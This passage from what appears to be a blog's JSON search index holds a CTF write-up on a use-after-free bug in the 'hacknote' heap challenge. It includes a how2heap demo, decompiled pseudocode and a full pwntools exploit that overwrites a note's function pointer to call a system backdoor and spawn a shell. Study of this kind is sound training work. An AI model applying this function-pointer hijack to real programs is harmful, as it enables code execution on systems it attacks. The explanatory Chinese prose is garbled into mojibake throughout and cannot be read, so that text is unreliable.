meaningp.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]},{"title":"UAF (Hacknote)","slug":"UAF-Hacknote","date":"2020-02-28T03:14:08.000Z","updated":"2021-03-24T09:47:23.314Z","comments":true,"path":"2020/02/28/UAF-Hacknote/","link":"","permalink":"http://example.com/2020/02/28/UAF-Hacknote/","excerpt":"â€‹ ä»å¤´å¼€å§‹å­¦ä¹ å †å †å †å †ğŸ˜¥ğŸ˜¥ğŸ˜¥ï¼ˆå…¶å®ä¹‹å‰ä¹Ÿæ²¡å­¦å¤šå°‘ï¼‰ã€‚","text":"â€‹ ä»å¤´å¼€å§‹å­¦ä¹ å †å †å †å †ğŸ˜¥ğŸ˜¥ğŸ˜¥ï¼ˆå…¶å®ä¹‹å‰ä¹Ÿæ²¡å­¦å¤šå°‘ï¼‰ã€‚ â€‹ è¯¾è®¾åšå¾ˆä¹…äº†ï¼Œæ‘¸é±¼åˆ’æ°´ä¹Ÿå¾ˆä¹…äº†ï¼ŒæŠ“ç´§æ—¶é—´ç³»ç»Ÿåœ°è‚ä¸€ä¸‹å †é¢˜å§ã€‚å†ä¸å¥½å¥½å­¦è¦åºŸäº†ã€‚ã€‚ 1.å…³äºUAFâ€‹ åœ¨mallocå¾—åˆ°ä¸€ä¸ªæŒ‡é’ˆå¹¶ä½¿ç”¨åï¼Œé€šå¸¸è¦å°†å…¶é‡Šæ”¾å¹¶ç½®ç©ºã€‚è‹¥æ˜¯å‡ºç°æœªå°†å…¶ç½®ç©ºçš„æƒ…å†µï¼Œå°±å®¹æ˜“å‡ºç°å¯åˆ©ç”¨çš„æ¼æ´ï¼Œä½¿å¾—ç”¨æˆ·ä»ç„¶å¯ä»¥è¿ç”¨æŒ‡é’ˆå†…çš„æ•°æ®æˆ–æ˜¯è°ƒç”¨å…¶ä¸­çš„æŒ‡ä»¤ã€‚ç®€å•æ¥è¯´iï¼ŒUAFå°±æ˜¯å¯¹ä¸€ä¸ªå·²é‡Šæ”¾å†…å­˜å—çš„å†åˆ©ç”¨ã€‚ CTF - wiki ç›¸å…³å¦‚ä¸‹ï¼š å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL ï¼Œ ç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒã€‚ å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œæ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬ã€‚ å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULLï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œæœ‰ä»£ç å¯¹è¿™å—å†…å­˜è¿›è¡Œäº†ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜ã€‚ ï¼ˆLink - https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/ï¼‰ Example from how2heap1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; typedef struct name &#123; char *myname; void (*func)(char *str); &#125; NAME; void myprint(char *str) &#123; printf(&quot;%s\\n&quot;, str); &#125; void printmyname() &#123; printf(&quot;call print my name\\n&quot;); &#125; int main() &#123; NAME *a; a = (NAME *)malloc(sizeof(struct name)); a-&gt;func = myprint; a-&gt;myname = &quot;I can also use it&quot;; a-&gt;func(&quot;this is my function&quot;); // free without modify free(a); a-&gt;func(&quot;I can also use it&quot;); // free with modify a-&gt;func = printmyname; a-&gt;func(&quot;this is my function&quot;); // set NULL a = NULL; printf(&quot;this pogram will crash...\\n&quot;); a-&gt;func(&quot;can not be printed...&quot;); &#125;/*The output:$use_after_free git:(use_after_free) âœ— ./use_after_free this is my functionI can also use itcall print my namethis pogram will crash...[1] 38738 segmentation fault (core dumped) ./use_after_free*/ 2.hacknoteå¤ç°â€‹ (Link - https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) A.é¢˜ç›®åˆ†æâ€‹ å¸¸è§„æ“ä½œï¼šä¸¢Ubuntu 1.checksec 2.fileï¼ˆå…¶å®æœ‰ä¿æŠ¤ä¹Ÿä¸ä¼šç»•è¿‡ã€‚ã€‚ã€‚tclï¼‰ â€‹ ç„¶åä¸¢IDAçœ‹æºç å’Œä¼ªç ï¼š â€‹ ä¸»è¦å‡½æ•°æœ‰è¿™å‡ ä¸ªï¼Œæ·»åŠ åˆ é™¤è¾“å‡ºä¸»å‡½æ•°ï¼Œmagic()æ˜¯å–œé—»ä¹è§çš„systemåé—¨ã€‚èœé¸¡çœ‹åˆ°åé—¨å‡½æ•°çš„ç¬¬ä¸€ç›´è§‰å°±æ˜¯æ”¹gotè¡¨ï¼Œæˆ–è€…ROPã€‚ã€‚ã€‚ä½†è¿™é‡Œå¥½åƒä¸å¤ªè¡Œï¼Œæ€ä¹ˆè¯´ä¹Ÿæ˜¯ä¸ªæ­£ç»å †é¢˜å•Šã€‚ â€‹ add_note: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546unsigned int add_note()&#123; _DWORD *v0; // ebx signed int i; // [esp+Ch] [ebp-1Ch] int size; // [esp+10h] [ebp-18h] char buf; // [esp+14h] [ebp-14h] unsigned int v5; // [esp+1Ch] [ebp-Ch] v5 = __readgsdword(0x14u); if ( count &lt;= 5 ) &#123; for ( i = 0; i &lt;= 4; ++i ) &#123; if ( !notelist[i] ) &#123; notelist[i] = malloc(8u); if ( !notelist[i] ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; *notelist[i] = print_note_content; // putå­—æ®µï¼Œ*notelist[i]ä¸ºå‡½æ•°æŒ‡é’ˆ printf(&quot;Note size :&quot;); read(0, &amp;buf, 8u); size = atoi(&amp;buf); v0 = notelist[i]; v0[1] = malloc(size); if ( !*(notelist[i] + 1) ) &#123; puts(&quot;Alloca Error&quot;); exit(-1); &#125; printf(&quot;Content :&quot;); read(0, *(notelist[i] + 1), size); puts(&quot;Success !&quot;); ++count; return __readgsdword(0x14u) ^ v5; &#125; &#125; &#125; else &#123; puts(&quot;Full&quot;); &#125; return __readgsdword(0x14u) ^ v5;&#125; â€‹ print_note:è°ƒç”¨äº†noteä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œå³print_content_function()å‡½æ•° 12345678910111213141516171819unsigned int print_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) (*notelist[v1])(notelist[v1]); // è°ƒç”¨notelist[v1]æ‰€æŒ‡å‡½æ•° return __readgsdword(0x14u) ^ v3; // å› æ­¤åˆ©ç”¨æ€è·¯ä¸ºï¼šæ”¹å†™notelist[v1]ä¹‹æ‰€æŒ‡&#125; â€‹ del_note:åœ¨æ­¤å‡½æ•°ä¸­å‘ç°ï¼Œå‡½æ•°ä»…å¯¹å †è¿›è¡Œfreeï¼Œä½†å¹¶æœªç½®ç©ºï¼Œå› æ­¤å­˜åœ¨UAFæ¼æ´ã€‚ 1234567891011121314151617181920212223unsigned int del_note()&#123; int v1; // [esp+4h] [ebp-14h] char buf; // [esp+8h] [ebp-10h] unsigned int v3; // [esp+Ch] [ebp-Ch] v3 = __readgsdword(0x14u); printf(&quot;Index :&quot;); read(0, &amp;buf, 4u); v1 = atoi(&amp;buf); if ( v1 &lt; 0 || v1 &gt;= count ) &#123; puts(&quot;Out of bound!&quot;); _exit(0); &#125; if ( notelist[v1] ) &#123; free(*(notelist[v1] + 1)); free(notelist[v1]); puts(&quot;Success&quot;); &#125; return __readgsdword(0x14u) ^ v3;&#125; â€‹ è¿˜æœ‰è¦æ³¨æ„çš„æ˜¯ï¼Œå¯¹äºæ¯ä¸ªnoteï¼Œéƒ½æœ‰ä¸€ä¸ªnotelistå‡½æ•°æŒ‡é’ˆptrï¼ŒæŒ‡å‘print_note_content()ã€‚å¹¶åœ¨æ–°å»ºnoteçš„æ—¶å€™å°±ä¼šè¢«åˆå§‹åŒ–ä¸ºprint_note_content(),æ‰€ä»¥æ— æ³•å¯¹äºå•ä¸ªnoteçš„ptrè¿›è¡Œæ”¹å†™ã€‚ print_note_content: 1234int __cdecl print_note_content(int a1)&#123; return puts(*(a1 + 4));&#125; â€‹ ä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªnoteï¼Œéƒ½åŒ…å«äº†ä¸¤ä¸ªchunkï¼Œç¬¬ä¸€ä¸ªï¼ˆ8 bytesï¼‰å­˜çš„æ˜¯å‡½æ•°æŒ‡é’ˆptrï¼Œå¦ä¸€ä¸ªæ˜¯æŒ‡å‘å†…å®¹çš„æŒ‡é’ˆptr_contentã€‚ç¬¬äºŒä¸ªå­˜çš„æ˜¯ç”¨æˆ·è¾“å…¥çš„contentã€‚ B.åˆ©ç”¨æ€è·¯â€‹ 1.èƒ½ç”±ç”¨æˆ·æ§åˆ¶çš„å†…å®¹åªæœ‰contentï¼Œæ‰€ä»¥åŸºæœ¬æ€è·¯å°±æ˜¯ç”¨ä¸€ä¸ªnote_açš„è¾“å…¥è¿‡ç¨‹ï¼Œå»æ”¹å†™note_bçš„å‡½æ•°æŒ‡é’ˆptrï¼Œå†print(note_b) â€‹ 2.è¦ä½¿å¾—note_bè¢«note_aæ”¹å†™ï¼Œé™¤éåè€…è¿›è¡Œå †æº¢å‡ºï¼Œæˆ–è€…ä¸¤è€…å†æŸä¸€æ—¶åˆ»åŒæ—¶æŒ‡å‘åŒä¸€å—å†…å­˜åŒºåŸŸã€‚å› æ­¤å¯ä»¥æƒ³åˆ°åˆ©ç”¨UAFæ¼æ´ï¼Œå…ˆfree(note_b)å†add(note_a)ï¼Œå°†payloadå†™å…¥åˆ°note_aä¸­ã€‚ â€‹ 3.å¦‚æœæœ‰ä¸¤ä¸ªç›¸é‚»çš„noteï¼Œå››ä¸ªç›¸é‚»çš„chunkï¼Œç»“æ„å¦‚ä¸‹ï¼š - å¯¹äºå‡½æ•°æŒ‡é’ˆå’Œå†…å®¹æŒ‡é’ˆï¼Œå„å 4 Bytesï¼Œå†åŠ ä¸Šå…¶ä»–chunkæ•°æ®å¹¶éµå¾ªå †å†…å­˜å¯¹é½ï¼Œå¯çŸ¥chunk1å’Œchunk3åˆ†åˆ«ä¸º16 Bytesã€‚ åˆ†åˆ«freeä¹‹åbiné“¾è¡¨å†…å®¹ä¸ºï¼š(head) chunk1 â€“&gt; chunk2 â€“&gt; chunk3 â€“&gt; chunk4 (tail)æ­¤æ—¶å†ç”³è¯·å‡ºnote2ï¼Œä½œä¸ºæ”¹å†™ç”¨çš„note_aã€‚ è€Œåœ¨mallocæ—¶ï¼Œå¦‚æœchunk2å’Œchunk4çš„å¤§å°(å³size of content)å¤§äº16 Bytesï¼Œä¸”note_aå¤§å°å°äº16 Bytesï¼Œç³»ç»Ÿå°±ä¼šä»biné“¾è¡¨å°¾éƒ¨å‘å¤´éƒ¨å¯»æ‰¾é€‚å½“å¤§å°çš„å·²é‡Šæ”¾chunkï¼Œè¿›è€Œå°†chunk3å’Œchunk1åˆ†é…ç»™note_aï¼Œè€Œchunk3å’Œchunk1ä¸­çš„ä¸¤ä¸ªæŒ‡é’ˆæ­£æ˜¯æˆ‘ä»¬è¦æ”¹å†™çš„åœ°æ–¹ã€‚ æ‰€ä»¥æˆ‘ä»¬çŸ¥é“ï¼Œéœ€è¦ç»™note0å’Œnote1çš„contentéƒ¨åˆ†åˆ†é…32bytesçš„å¤§å°ã€‚ â€‹ 4.å†…å­˜åˆ†é…æƒ…å†µå†³å®šä¹‹åï¼Œåªéœ€è¦å°†note0è§†ä½œnote_bï¼Œåœ¨note_aä¸­å†™å…¥payloadï¼ˆnote_açš„contentéƒ¨åˆ†ä¸note_bçš„contentéƒ¨åˆ†ä¸ºåŒä¸€å†…å­˜å—ï¼‰ï¼Œå³å¯æ”¹å†™note_bçš„å‡½æ•°æŒ‡é’ˆã€‚è°ƒç”¨å‡½æ•°print(note_b)å³å¯getshellã€‚ C.exp:123456789101112131415161718192021222324252627282930313233343536from pwn import *r = process(&#x27;./hacknote&#x27;)def addnote(size, content): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(size)) r.recvuntil(&quot;:&quot;) r.sendline(content) def delnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;2&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))def printnote(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;3&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx))magic = 0x08048986addnote(32, &quot;aaaa&quot;) # add note 0addnote(32, &quot;ddaa&quot;) # add note 1delnote(0) # delete note 0delnote(1) # delete note 1addnote(8, p32(magic)) # add note 2printnote(0) # print note 0r.interactive()","categories":[],"tags":[{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]}],"categories":[],"tags":[{"name":"AndroidRe","slug":"AndroidRe","permalink":"http://example.com/tags/AndroidRe/"},{"name":"Summary","slug":"Summary","permalink":"http://example.com/tags/Summary/"},{"name":"StackOverflow","slug":"StackOverflow","permalink":"http://example.com/tags/StackOverflow/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://example.com/tags/WriteUp/"},{"name":"heap","slug":"heap","permalink":"http://example.com/tags/heap/"}]}